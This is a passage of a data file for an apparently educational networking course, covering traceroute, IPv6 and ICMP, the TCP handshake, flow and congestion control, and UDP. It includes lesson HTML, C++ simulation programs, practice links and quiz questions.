TTL=2 expired here)\n3  72.14.233.128    12.1 ms   (Google edge)\n4  142.250.80.46    11.8 ms   (destination)</div><div class="learn-tip"><b>Interview tip:</b> "How does traceroute work?" is a common networking interview question. Answer: sends UDP (Linux) or ICMP (Windows) packets with incrementing TTL; each hop returns ICMP Time Exceeded; destination returns ICMP Port Unreachable (UDP) or Echo Reply (ICMP).</div></div>',
          code: `// === IPv6 and ICMP Concepts Simulation ===
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
using namespace std;

// Validate if a string is a valid simplified IPv6 address
bool isValidIPv6(const string& addr) {
    int colonCount = 0;
    bool hasDoubleColon = false;
    for (size_t i = 0; i < addr.size(); i++) {
        if (addr[i] == ':') {
            colonCount++;
            if (i + 1 < addr.size() && addr[i+1] == ':') {
                if (hasDoubleColon) return false;
                hasDoubleColon = true;
            }
        }
    }
    if (!hasDoubleColon && colonCount != 7) return false;
    if (hasDoubleColon && colonCount > 7) return false;
    return true;
}

// Simulate traceroute
void simulateTraceroute(const string& dest, const vector<string>& hops) {
    cout << "traceroute to " << dest << endl;
    for (int i = 0; i < (int)hops.size(); i++) {
        cout << "  " << (i + 1) << "  " << hops[i];
        if (i == (int)hops.size() - 1)
            cout << "  <-- destination reached" << endl;
        else
            cout << "  (TTL=" << (i+1) << " expired, ICMP Time Exceeded)" << endl;
    }
}

// ICMP message types
void explainICMP() {
    cout << "\\n=== Common ICMP Message Types ===" << endl;
    cout << "Type 0:  Echo Reply (ping response)" << endl;
    cout << "Type 3:  Destination Unreachable" << endl;
    cout << "  Code 0: Network unreachable" << endl;
    cout << "  Code 1: Host unreachable" << endl;
    cout << "  Code 3: Port unreachable (used by traceroute)" << endl;
    cout << "Type 5:  Redirect (better route exists)" << endl;
    cout << "Type 8:  Echo Request (ping)" << endl;
    cout << "Type 11: Time Exceeded (TTL=0, used by traceroute)" << endl;
}

int main() {
    // IPv6 validation
    cout << "=== IPv6 Address Validation ===" << endl;
    vector<string> addrs = {"2001:db8::1", "::1", "fe80::1%eth0", "2001:db8:85a3::8a2e:370:7334"};
    for (auto& a : addrs)
        cout << "  " << a << " -> " << (isValidIPv6(a) ? "valid" : "check format") << endl;

    // IPv4 vs IPv6 comparison
    cout << "\\n=== IPv4 vs IPv6 ===" << endl;
    cout << "IPv4: 32-bit, ~4.3 billion addresses" << endl;
    cout << "IPv6: 128-bit, ~3.4 x 10^38 addresses" << endl;
    cout << "IPv6 removes: header checksum, fragmentation by routers, broadcast" << endl;
    cout << "IPv6 adds: flow labels, mandatory IPsec, SLAAC" << endl;

    // Traceroute simulation
    cout << "\\n=== Traceroute Simulation ===" << endl;
    simulateTraceroute("google.com", {"192.168.1.1", "10.0.0.1", "72.14.233.128", "142.250.80.46"});

    explainICMP();
    return 0;
}`,
          problems: [
            ['IPv6 Concepts', 'https://www.geeksforgeeks.org/internet-protocol-version-6-ipv6/', 'Easy'],
            ['ICMP Protocol', 'https://www.geeksforgeeks.org/internet-control-message-protocol-icmp/', 'Easy'],
            ['Traceroute Explained', 'https://www.geeksforgeeks.org/traceroute-command-in-linux-with-examples/', 'Medium'],
          ],
          mcqs: [
            {q: 'IPv6 addresses are how many bits?', o: ['32', '64', '128', '256'], a: 2},
            {q: 'Which ICMP message type is used by traceroute when TTL expires?', o: ['Echo Reply (type 0)', 'Destination Unreachable (type 3)', 'Redirect (type 5)', 'Time Exceeded (type 11)'], a: 3},
            {q: 'IPv6 eliminates which IPv4 feature?', o: ['TCP support', 'Broadcast', 'Routing', 'Port numbers'], a: 1},
          ],
        },
      ]
    },

    // ==================== TAB 4: Transport Layer ====================
    {
      id: 'trans', t: 'Transport Layer',
      topics: [
        {
          t: 'TCP 3-Way Handshake & Flow Control',
          learn: '<div class="learn-section"><div class="learn-h">TCP Overview</div><p class="learn-p"><b>TCP (Transmission Control Protocol)</b> is a <b>connection-oriented, reliable, byte-stream</b> transport protocol defined in <b>RFC 793</b>. It provides: reliable data delivery (no loss, no duplicates, in-order), flow control, congestion control, and full-duplex communication. TCP operates on <b>port numbers</b> (16-bit: 0-65535) to multiplex connections.</p><p class="learn-p">A TCP connection is identified by a <b>4-tuple</b>: (Source IP, Source Port, Destination IP, Destination Port). Well-known ports: HTTP=80, HTTPS=443, SSH=22, FTP=21, DNS=53, SMTP=25.</p></div><div class="learn-section"><div class="learn-h">TCP Segment Structure</div><div class="learn-code">0                   1                   2                   3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|          Source Port          |       Destination Port        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                        Sequence Number                        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                    Acknowledgment Number                      |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Offset|  Res  |C|E|U|A|P|R|S|F|           Window Size         |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|           Checksum            |       Urgent Pointer          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><p class="learn-p">Key fields:</p><ul class="learn-list"><li><b>Sequence Number (32 bits):</b> Byte offset of the first data byte in this segment.</li><li><b>Acknowledgment Number (32 bits):</b> Next byte the receiver expects (cumulative ACK).</li><li><b>Flags:</b> SYN (synchronize), ACK (acknowledgment), FIN (finish), RST (reset), PSH (push), URG (urgent).</li><li><b>Window Size (16 bits):</b> Receiver\'s available buffer space (for flow control). Can be scaled using Window Scale option.</li><li><b>Checksum:</b> Covers header + data + pseudo-header (src IP, dst IP, protocol, length).</li></ul></div><div class="learn-section"><div class="learn-h">TCP 3-Way Handshake (Connection Establishment)</div><p class="learn-p">TCP uses a <b>3-way handshake</b> to establish a reliable connection before data transfer begins. Both sides synchronize their sequence numbers and agree on parameters.</p><div class="learn-code">Client                                Server\n  |                                     |\n  |--- SYN (seq=x) -------------------&gt;|\n  |    (Client chooses ISN = x)         |  State: SYN_SENT\n  |                                     |\n  |&lt;-- SYN+ACK (seq=y, ack=x+1) ------|  State: SYN_RCVD\n  |    (Server chooses ISN = y)         |\n  |                                     |\n  |--- ACK (seq=x+1, ack=y+1) --------&gt;|  State: ESTABLISHED\n  |                                     |  State: ESTABLISHED\n  |=== Data transfer can begin =========|</div><p class="learn-p"><b>Step-by-step:</b></p><ol class="learn-list"><li><b>SYN:</b> Client sends a SYN segment with its <b>Initial Sequence Number (ISN)</b> x. The SYN flag consumes one sequence number.</li><li><b>SYN-ACK:</b> Server responds with SYN+ACK. Its own ISN is y. It acknowledges the client\'s SYN with ack=x+1.</li><li><b>ACK:</b> Client acknowledges the server\'s SYN with ack=y+1. Connection is now <b>ESTABLISHED</b> on both sides.</li></ol><div class="learn-warn"><b>Warning:</b> The ISN is NOT always 0. Modern systems use <b>randomized ISNs</b> to prevent TCP sequence number prediction attacks. The ISN was historically incremented by a fixed amount per connection, but this was exploitable.</div></div><div class="learn-section"><div class="learn-h">TCP Connection Termination (4-Way Handshake)</div><p class="learn-p">TCP uses a <b>4-way handshake</b> to gracefully close a connection. Either side can initiate the close.</p><div class="learn-code">Client                                Server\n  |                                     |\n  |--- FIN (seq=u) -------------------&gt;|  Client: FIN_WAIT_1\n  |                                     |\n  |&lt;-- ACK (ack=u+1) -----------------|  Client: FIN_WAIT_2\n  |                                     |  Server: CLOSE_WAIT\n  |                                     |\n  |&lt;-- FIN (seq=v) -------------------|  Server: LAST_ACK\n  |                                     |\n  |--- ACK (ack=v+1) ----------------&gt;|  Client: TIME_WAIT\n  |                                     |  Server: CLOSED\n  |                                     |\n  | (wait 2*MSL = ~60s)                |\n  | Client: CLOSED                      |</div><p class="learn-p"><b>TIME_WAIT state:</b> The client waits <b>2 * MSL (Maximum Segment Lifetime)</b> before fully closing. This ensures:</p><ul class="learn-list"><li>The final ACK reaches the server (if lost, server retransmits FIN).</li><li>Old duplicate segments from this connection expire and don\'t interfere with new connections on the same port.</li></ul><div class="learn-tip"><b>Tip:</b> The <b>half-close</b> feature of TCP allows one side to stop sending (FIN) but continue receiving. The CLOSE_WAIT state on the server side means the server can still send data after receiving the client\'s FIN.</div></div><div class="learn-section"><div class="learn-h">TCP State Diagram Summary</div><div class="learn-code">CLOSED &rarr; (send SYN) &rarr; SYN_SENT &rarr; (recv SYN+ACK, send ACK) &rarr; ESTABLISHED\nCLOSED &rarr; (recv SYN, send SYN+ACK) &rarr; SYN_RCVD &rarr; (recv ACK) &rarr; ESTABLISHED\n\nESTABLISHED &rarr; (send FIN) &rarr; FIN_WAIT_1 &rarr; (recv ACK) &rarr; FIN_WAIT_2\nFIN_WAIT_2 &rarr; (recv FIN, send ACK) &rarr; TIME_WAIT &rarr; (2*MSL timeout) &rarr; CLOSED\n\nESTABLISHED &rarr; (recv FIN, send ACK) &rarr; CLOSE_WAIT &rarr; (send FIN) &rarr; LAST_ACK\nLAST_ACK &rarr; (recv ACK) &rarr; CLOSED</div></div><div class="learn-section"><div class="learn-h">TCP Flow Control</div><p class="learn-p">TCP uses a <b>sliding window</b> mechanism for flow control. The receiver advertises its available buffer space via the <b>Window Size</b> field (also called <b>rwnd</b> — receiver window). The sender must not send more unacknowledged data than the receiver window allows.</p><div class="learn-code">Sender\'s effective window = min(cwnd, rwnd)\n\nExample:\n  Receiver buffer = 4000 bytes\n  Receiver has 1000 bytes unread\n  rwnd = 4000 - 1000 = 3000 bytes\n\n  Sender can send up to 3000 bytes of unACKed data.</div><p class="learn-p"><b>Zero Window:</b> If the receiver\'s buffer is full, it advertises <b>rwnd = 0</b>. The sender stops sending data but periodically sends <b>Window Probe</b> segments (1 byte) to check if the window has opened. This prevents <b>deadlock</b>.</p><p class="learn-p"><b>Silly Window Syndrome:</b> When the receiver frees only a tiny amount of buffer and advertises a small window, leading to many tiny segments. Solutions:</p><ul class="learn-list"><li><b>Nagle\'s Algorithm (sender-side):</b> Buffer small segments and send when either (a) enough data to fill MSS, or (b) ACK for previous data received.</li><li><b>Clark\'s Solution / Delayed ACK (receiver-side):</b> Don\'t advertise a small window; wait until the buffer has at least MSS or half the buffer free.</li></ul></div><div class="learn-section"><div class="learn-h">TCP Retransmission</div><p class="learn-p">TCP ensures reliability via <b>retransmission</b>. Two mechanisms trigger retransmission:</p><ol class="learn-list"><li><b>Timeout (RTO):</b> If an ACK is not received within the <b>Retransmission Timeout</b>, the segment is retransmitted. RTO is dynamically calculated using SRTT (Smoothed Round-Trip Time) and RTTVAR (RTT Variance).</li><li><b>Fast Retransmit:</b> If the sender receives <b>3 duplicate ACKs</b> for the same sequence number, it retransmits the missing segment immediately without waiting for timeout.</li></ol><div class="learn-code">RTO Calculation (Jacobson\'s Algorithm):\nSRTT = (1 - &alpha;) * SRTT + &alpha; * RTT_sample     (&alpha; = 1/8)\nRTTVAR = (1 - &beta;) * RTTVAR + &beta; * |SRTT - RTT_sample|  (&beta; = 1/4)\nRTO = SRTT + 4 * RTTVAR\n\nOn timeout: RTO is doubled (exponential backoff)</div></div>',
          code: `// === TCP 3-Way Handshake & Flow Control Simulation in C++ ===
#include <iostream>
#include <string>
#include <queue>
#include <cstdlib>
#include <ctime>
using namespace std;

// TCP Flags
const int SYN = 0x02;
const int ACK = 0x10;
const int FIN = 0x01;
const int RST = 0x04;
const int PSH = 0x08;

struct TCPSegment {
    int srcPort;
    int dstPort;
    uint32_t seqNum;
    uint32_t ackNum;
    int flags;
    int windowSize;
    string data;

    string flagsToString() {
        string s;
        if (flags & SYN) s += "SYN ";
        if (flags & ACK) s += "ACK ";
        if (flags & FIN) s += "FIN ";
        if (flags & RST) s += "RST ";
        if (flags & PSH) s += "PSH ";
        return s;
    }
};

// ---- 3-Way Handshake Simulation ----
void threeWayHandshake() {
    cout << "=== TCP 3-Way Handshake ===" << endl;
    srand(time(0));

    // Client ISN
    uint32_t clientISN = rand() % 100000;
    // Server ISN
    uint32_t serverISN = rand() % 100000;

    // Step 1: Client -> SYN
    TCPSegment syn;
    syn.srcPort = 49152;
    syn.dstPort = 80;
    syn.seqNum = clientISN;
    syn.ackNum = 0;
    syn.flags = SYN;
    syn.windowSize = 65535;
    cout << "Client -> Server: [" << syn.flagsToString()
         << "] seq=" << syn.seqNum << endl;

    // Step 2: Server -> SYN+ACK
    TCPSegment synack;
    synack.srcPort = 80;
    synack.dstPort = 49152;
    synack.seqNum = serverISN;
    synack.ackNum = clientISN + 1;
    synack.flags = SYN | ACK;
    synack.windowSize = 32768;
    cout << "Server -> Client: [" << synack.flagsToString()
         << "] seq=" << synack.seqNum
         << " ack=" << synack.ackNum << endl;

    // Step 3: Client -> ACK
    TCPSegment ack;
    ack.srcPort = 49152;
    ack.dstPort = 80;
    ack.seqNum = clientISN + 1;
    ack.ackNum = serverISN + 1;
    ack.flags = ACK;
    ack.windowSize = 65535;
    cout << "Client -> Server: [" << ack.flagsToString()
         << "] seq=" << ack.seqNum
         << " ack=" << ack.ackNum << endl;

    cout << "Connection ESTABLISHED!" << endl;
}

// ---- Connection Termination ----
void fourWayTermination() {
    cout << "\\n=== TCP 4-Way Termination ===" << endl;
    uint32_t clientSeq = 5000, serverSeq = 8000;

    // Step 1: Client -> FIN
    cout << "Client -> Server: [FIN ACK] seq=" << clientSeq
         << " ack=" << serverSeq << "  (FIN_WAIT_1)" << endl;

    // Step 2: Server -> ACK
    cout << "Server -> Client: [ACK] seq=" << serverSeq
         << " ack=" << (clientSeq + 1) << "  (CLOSE_WAIT)" << endl;

    // Step 3: Server -> FIN
    cout << "Server -> Client: [FIN ACK] seq=" << serverSeq
         << " ack=" << (clientSeq + 1) << "  (LAST_ACK)" << endl;

    // Step 4: Client -> ACK
    cout << "Client -> Server: [ACK] seq=" << (clientSeq + 1)
         << " ack=" << (serverSeq + 1) << "  (TIME_WAIT)" << endl;
    cout << "Waiting 2*MSL (60 seconds)..." << endl;
    cout << "Connection CLOSED." << endl;
}

// ---- Flow Control Simulation ----
void flowControlSimulation() {
    cout << "\\n=== TCP Flow Control ===" << endl;
    const int BUFFER_SIZE = 10; // receiver buffer (simplified)
    int rwnd = BUFFER_SIZE;     // receiver window
    int bytesInFlight = 0;

    // Simulate sending data
    int totalData = 25; // bytes to send
    int sent = 0;
    int acked = 0;

    while (acked < totalData) {
        // Send up to rwnd bytes
        int canSend = min(rwnd - bytesInFlight, totalData - sent);
        if (canSend > 0) {
            cout << "Sender: Send " << canSend << " bytes (seq "
                 << sent << "-" << (sent + canSend - 1) << ")"
                 << " [rwnd=" << rwnd << ", in-flight="
                 << bytesInFlight << "]" << endl;
            sent += canSend;
            bytesInFlight += canSend;
        }

        // Simulate receiver processing
        int processed = min(bytesInFlight, 3); // app reads 3 bytes
        acked += processed;
        bytesInFlight -= processed;
        rwnd = BUFFER_SIZE - bytesInFlight;

        cout << "Receiver: ACK " << acked << ", rwnd=" << rwnd << endl;

        if (rwnd == 0) {
            cout << "** Zero Window! Sender pauses. **" << endl;
            // Window probe
            rwnd = 3; // simulate app reading
            cout << "Window Probe -> rwnd updated to " << rwnd << endl;
        }
    }
    cout << "All " << totalData << " bytes delivered!" << endl;
}

// ---- RTO Calculation ----
void rtoCalculation() {
    cout << "\\n=== RTO Calculation ===" << endl;
    double srtt = 0, rttvar = 0, rto = 1.0;
    double alpha = 0.125, beta = 0.25;

    double samples[] = {100, 120, 80, 90, 150, 85, 110};

    for (int i = 0; i < 7; i++) {
        double rtt = samples[i];
        if (i == 0) {
            srtt = rtt;
            rttvar = rtt / 2.0;
        } else {
            rttvar = (1 - beta) * rttvar + beta * abs(srtt - rtt);
            srtt = (1 - alpha) * srtt + alpha * rtt;
        }
        rto = srtt + 4 * rttvar;
        cout << "RTT sample " << rtt << " ms -> SRTT="
             << (int)srtt << " RTTVAR=" << (int)rttvar
             << " RTO=" << (int)rto << " ms" << endl;
    }
}

int main() {
    threeWayHandshake();
    fourWayTermination();
    flowControlSimulation();
    rtoCalculation();
    return 0;
}`,
          problems: [
            ['TCP 3-Way Handshake Questions', 'https://www.geeksforgeeks.org/tcp-3-way-handshake-process/', 'Easy'],
            ['TCP Connection Termination', 'https://www.geeksforgeeks.org/tcp-connection-termination/', 'Medium'],
            ['TCP Flow Control Problems', 'https://www.geeksforgeeks.org/tcp-tahoe-and-tcp-reno/', 'Medium'],
          ],
          mcqs: [
            {q: 'During the TCP 3-way handshake, what flag combination does the server send in step 2?', o: ['SYN only', 'ACK only', 'SYN + ACK', 'FIN + ACK'], a: 2},
            {q: 'What is the purpose of the TIME_WAIT state?', o: ['Allow the server to send remaining data', 'Ensure the final ACK reaches the server and old segments expire', 'Wait for DNS resolution', 'Buffer incoming connections'], a: 1},
            {q: 'TCP flow control uses which field in the TCP header?', o: ['Urgent Pointer', 'Checksum', 'Window Size', 'Sequence Number'], a: 2},
          ],
        },
        {
          t: 'TCP Congestion Control & UDP',
          learn: '<div class="learn-section"><div class="learn-h">Why Congestion Control?</div><p class="learn-p">While <b>flow control</b> prevents the sender from overwhelming the <b>receiver</b>, <b>congestion control</b> prevents the sender from overwhelming the <b>network</b>. When too many packets are injected into the network, routers\' buffers overflow, causing packet loss, increased delays, and potential <b>congestion collapse</b> (throughput drops to near zero despite high load).</p><p class="learn-p">TCP congestion control is <b>end-to-end</b> — the sender infers congestion from packet loss (timeout or duplicate ACKs) and adjusts its sending rate accordingly using a <b>congestion window (cwnd)</b>.</p><div class="learn-code">Effective sending rate = min(cwnd, rwnd) / RTT\n\ncwnd: sender\'s congestion window (network capacity)\nrwnd: receiver\'s advertised window (receiver capacity)\nThe sender always uses the smaller of the two.</div></div><div class="learn-section"><div class="learn-h">TCP Congestion Control Phases</div><p class="learn-p">TCP uses four main algorithms for congestion control, often collectively called <b>TCP Tahoe/Reno</b>:</p><p class="learn-p"><b>1. Slow Start:</b></p><ul class="learn-list"><li>Initial <code>cwnd = 1 MSS</code> (Maximum Segment Size, typically 1460 bytes).</li><li><code>cwnd</code> <b>doubles every RTT</b> (exponential growth): 1, 2, 4, 8, 16, ...</li><li>Actually: cwnd increases by 1 MSS for every ACK received.</li><li>Continues until <code>cwnd</code> reaches <b>ssthresh</b> (slow start threshold), then switches to Congestion Avoidance.</li></ul><p class="learn-p"><b>2. Congestion Avoidance:</b></p><ul class="learn-list"><li>When <code>cwnd &ge; ssthresh</code>, growth becomes <b>linear</b> (additive increase).</li><li><code>cwnd</code> increases by <b>1 MSS per RTT</b> (not per ACK).</li><li>Implementation: <code>cwnd += MSS * MSS / cwnd</code> for each ACK.</li></ul><p class="learn-p"><b>3. Fast Retransmit:</b></p><ul class="learn-list"><li>When sender receives <b>3 duplicate ACKs</b>, it retransmits the lost segment immediately (without waiting for timeout).</li><li>3 dup ACKs indicate that some segments after the lost one arrived — network is still delivering, so congestion is not catastrophic.</li></ul><p class="learn-p"><b>4. Fast Recovery (TCP Reno only):</b></p><ul class="learn-list"><li>After fast retransmit, set <code>ssthresh = cwnd/2</code> and <code>cwnd = ssthresh + 3 MSS</code>.</li><li>For each additional duplicate ACK: <code>cwnd += 1 MSS</code>.</li><li>When new (non-duplicate) ACK arrives: <code>cwnd = ssthresh</code>, enter Congestion Avoidance.</li></ul></div><div class="learn-section"><div class="learn-h">TCP Tahoe vs TCP Reno</div><table class="learn-table"><tr><th>Event</th><th>TCP Tahoe</th><th>TCP Reno</th></tr><tr><td>Timeout</td><td>ssthresh = cwnd/2, cwnd = 1, Slow Start</td><td>ssthresh = cwnd/2, cwnd = 1, Slow Start</td></tr><tr><td>3 Duplicate ACKs</td><td>ssthresh = cwnd/2, cwnd = 1, Slow Start</td><td>ssthresh = cwnd/2, cwnd = ssthresh (Fast Recovery)</td></tr></table><div class="learn-code">Example — TCP Reno:\n\nInitial: cwnd = 1, ssthresh = 16\n\nSlow Start (exponential):\nRTT 1: cwnd = 1\nRTT 2: cwnd = 2\nRTT 3: cwnd = 4\nRTT 4: cwnd = 8\nRTT 5: cwnd = 16  (= ssthresh, switch to Congestion Avoidance)\n\nCongestion Avoidance (linear):\nRTT 6: cwnd = 17\nRTT 7: cwnd = 18\n...\nRTT 10: cwnd = 21\n\n** 3 Dup ACKs detected at cwnd = 21 **\nFast Retransmit: retransmit lost segment\nFast Recovery: ssthresh = 21/2 = 10, cwnd = 10\n\nCongestion Avoidance (from cwnd = 10):\nRTT 11: cwnd = 11\nRTT 12: cwnd = 12\n...</div><div class="learn-tip"><b>Tip:</b> The "sawtooth" pattern of TCP throughput comes from the additive increase (linear growth in congestion avoidance) followed by multiplicative decrease (halving cwnd on loss). This is called <b>AIMD — Additive Increase, Multiplicative Decrease</b>.</div></div><div class="learn-section"><div class="learn-h">Modern TCP Variants</div><table class="learn-table"><tr><th>Variant</th><th>Key Feature</th><th>Use Case</th></tr><tr><td>TCP NewReno</td><td>Improved fast recovery (handles multiple losses in one window)</td><td>General purpose</td></tr><tr><td>TCP CUBIC</td><td>Cubic function for cwnd growth (default in Linux)</td><td>High-bandwidth, high-latency</td></tr><tr><td>TCP BBR (Google)</td><td>Model-based, estimates bottleneck bandwidth and RTT</td><td>Google services</td></tr><tr><td>TCP Vegas</td><td>Uses RTT changes (delay-based) instead of loss</td><td>Low-loss environments</td></tr></table></div><div class="learn-section"><div class="learn-h">UDP (User Datagram Protocol)</div><p class="learn-p"><b>UDP</b> is a <b>connectionless, unreliable, message-oriented</b> transport protocol. It provides <b>minimal service</b> — just multiplexing (via ports) and an optional checksum. There is <b>no handshake, no retransmission, no flow control, no congestion control, and no ordering guarantee</b>.</p><div class="learn-code">UDP Header (8 bytes only):\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|          Source Port          |       Destination Port        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|            Length              |           Checksum            |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                         Data (payload)                        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><p class="learn-p"><b>Why use UDP?</b></p><ul class="learn-list"><li><b>Low latency:</b> No connection setup delay (no 3-way handshake).</li><li><b>Low overhead:</b> 8-byte header vs 20+ byte TCP header.</li><li><b>No head-of-line blocking:</b> Lost packets don\'t delay others.</li><li><b>Supports broadcast/multicast.</b></li></ul></div><div class="learn-section"><div class="learn-h">TCP vs UDP Comparison</div><table class="learn-table"><tr><th>Feature</th><th>TCP</th><th>UDP</th></tr><tr><td>Connection</td><td>Connection-oriented (3-way handshake)</td><td>Connectionless</td></tr><tr><td>Reliability</td><td>Reliable (ACKs, retransmission)</td><td>Unreliable (best effort)</td></tr><tr><td>Ordering</td><td>In-order delivery</td><td>No ordering guarantee</td></tr><tr><td>Flow Control</td><td>Yes (sliding window)</td><td>No</td></tr><tr><td>Congestion Control</td><td>Yes (AIMD)</td><td>No</td></tr><tr><td>Header Size</td><td>20-60 bytes</td><td>8 bytes</td></tr><tr><td>Speed</td><td>Slower (overhead)</td><td>Faster</td></tr><tr><td>Use Cases</td><td>HTTP, HTTPS, SSH, FTP, Email</td><td>DNS, DHCP, VoIP, Gaming, Streaming</td></tr></table><div class="learn-warn"><b>Warning:</b> Common interview misconception: "UDP is always faster than TCP." While UDP has less overhead, TCP with modern optimizations (fast open, window scaling, CUBIC) can achieve very high throughput. The choice depends on whether you need reliability.</div></div><div class="learn-section"><div class="learn-h">Applications and Port Numbers</div><table class="learn-table"><tr><th>Application</th><th>Protocol</th><th>Port</th></tr><tr><td>HTTP</td><td>TCP</td><td>80</td></tr><tr><td>HTTPS</td><td>TCP</td><td>443</td></tr><tr><td>DNS</td><td>UDP (and TCP for large responses)</td><td>53</td></tr><tr><td>DHCP</td><td>UDP</td><td>67/68</td></tr><tr><td>SSH</td><td>TCP</td><td>22</td></tr><tr><td>FTP</td><td>TCP</td><td>20/21</td></tr><tr><td>SMTP</td><td>TCP</td><td>25</td></tr><tr><td>SNMP</td><td>UDP</td><td>161</td></tr></table></div>',
          code: `// === TCP Congestion Control Simulation & UDP Socket in C++ ===
#include <iostream>
#include <vector>
#include <algorithm>
#include <cmath>
using namespace std;

// ---- TCP Congestion Control Simulator ----
enum class TCPVariant { TAHOE, RENO };

struct CongestionState {
    double cwnd;      // congestion window (in MSS units)
    double ssthresh;  // slow start threshold
    int round;        // RTT round number
    string phase;     // current phase
};

void simulateTCPCongestion(TCPVariant variant, int rounds,
                           int lossRound, bool isDupAck) {
    string name = (variant == TCPVariant::TAHOE) ? "Tahoe" : "Reno";
    cout << "=== TCP " << name << " Congestion Control ===" << endl;
    cout << "Loss at round " << lossRound
         << (isDupAck ? " (3 dup ACKs)" : " (timeout)") << endl;
    cout << "Round\\tcwnd\\tssthresh\\tPhase" << endl;

    double cwnd = 1.0;
    double ssthresh = 64.0;
    string phase = "Slow Start";

    for (int r = 1; r <= rounds; r++) {
        // Check for loss event
        if (r == lossRound) {
            ssthresh = max(cwnd / 2.0, 2.0);

            if (!isDupAck) {
                // Timeout: both Tahoe and Reno go to cwnd=1
                cwnd = 1.0;
                phase = "Slow Start (after timeout)";
            } else {
                // 3 Dup ACKs
                if (variant == TCPVariant::TAHOE) {
                    cwnd = 1.0;
                    phase = "Slow Start (after 3 dup ACK)";
                } else {
                    // Reno: Fast Recovery
                    cwnd = ssthresh; // skip slow start
                    phase = "Cong. Avoidance (Fast Recovery)";
                }
            }
        } else {
            // Normal operation
            if (cwnd < ssthresh) {
                // Slow Start: exponential growth
                cwnd *= 2;
                if (cwnd >= ssthresh) {
                    cwnd = ssthresh;
                    phase = "Congestion Avoidance";
                } else {
                    phase = "Slow Start";
                }
            } else {
                // Congestion Avoidance: linear growth
                cwnd += 1;
                phase = "Congestion Avoidance";
            }
        }

        cout << r << "\\t" << (int)cwnd << "\\t" << (int)ssthresh
             << "\\t\\t" << phase << endl;
    }
}

// ---- TCP Throughput Calculator ----
void tcpThroughput() {
    cout << "\\n=== TCP Throughput Estimation ===" << endl;

    // Mathis formula: Throughput ≈ (MSS / RTT) * (C / sqrt(p))
    // where p = packet loss rate, C ≈ 1.22
    double mss = 1460;   // bytes
    double rtt = 0.050;  // 50 ms
    double losses[] = {0.001, 0.01, 0.05, 0.10};

    cout << "MSS=" << mss << " bytes, RTT=" << (rtt*1000) << " ms" << endl;
    cout << "Loss Rate\\tEstimated Throughput" << endl;

    for (double p : losses) {
        double throughput = (mss / rtt) * (1.22 / sqrt(p)); // bytes/sec
        double mbps = throughput * 8 / 1e6;
        cout << (p * 100) << "%\\t\\t"
             << (int)(mbps * 100) / 100.0 << " Mbps" << endl;
    }
}

// ---- UDP vs TCP Header Comparison ----
void headerComparison() {
    cout << "\\n=== Header Size Comparison ===" << endl;

    struct HeaderField {
        string name;
        int tcpBits;
        int udpBits;
    };

    vector<HeaderField> fields = {
        {"Source Port",       16, 16},
        {"Destination Port",  16, 16},
        {"Sequence Number",   32,  0},
        {"ACK Number",        32,  0},
        {"Data Offset",        4,  0},
        {"Reserved",           6,  0},
        {"Flags",              6,  0},
        {"Window Size",       16,  0},
        {"Checksum",          16, 16},
        {"Urgent Pointer",    16,  0},
        {"Length",             0, 16}
    };

    int tcpTotal = 0, udpTotal = 0;
    cout << "Field\\t\\t\\tTCP (bits)\\tUDP (bits)" << endl;
    for (auto& f : fields) {
        if (f.tcpBits > 0 || f.udpBits > 0) {
            cout << f.name;
            // Padding for alignment
            if (f.name.size() < 16) cout << "\\t";
            if (f.name.size() < 8) cout << "\\t";
            cout << "\\t" << f.tcpBits << "\\t\\t" << f.udpBits << endl;
        }
        tcpTotal += f.tcpBits;
        udpTotal += f.udpBits;
    }
    cout << "TOTAL\\t\\t\\t" << tcpTotal << " bits ("
         << tcpTotal/8 << " bytes)\\t" << udpTotal << " bits ("
         << udpTotal/8 << " bytes)" << endl;
}

// ---- AIMD Visualization ----
void aimdVisualization() {
    cout << "\\n=== AIMD Pattern (cwnd over time) ===" << endl;
    double cwnd = 1.0, ssthresh = 16.0;
    int cycle = 0;

    for (int r = 1; r <= 40; r++) {
        if (cwnd < ssthresh) {
            cwnd *= 2;
            if (cwnd > ssthresh) cwnd = ssthresh;
        } else {
            cwnd += 1;
        }

        // Simulate loss at cwnd = 24
        if (cwnd >= 24) {
            cout << "RTT " << r << ": cwnd=" << (int)cwnd
                 << " ** LOSS ** ";
            ssthresh = cwnd / 2;
            cwnd = ssthresh; // Reno behavior
            cout << "ssthresh=" << (int)ssthresh << endl;
            cycle++;
            if (cycle >= 3) break;
        } else {
            // Print bar chart
            cout << "RTT " << r << ": cwnd=" << (int)cwnd << " ";
            for (int i = 0; i < (int)cwnd; i++) cout << "#";
            cout << endl;
        }
    }
}

int main() {
    // TCP Reno with 3 dup ACKs at round 10
    simulateTCPCongestion(TCPVariant::RENO, 20, 10, true);

    cout << endl;
    // TCP Tahoe with timeout at round 10
    simulateTCPCongestion(TCPVariant::TAHOE, 20, 10, false);

    tcpThroughput();
    headerComparison();
    aimdVisualization();
    return 0;
}`,
          problems: [
            ['TCP Congestion Control Practice', 'https://www.geeksforgeeks.org/tcp-congestion-control/', 'Medium'],
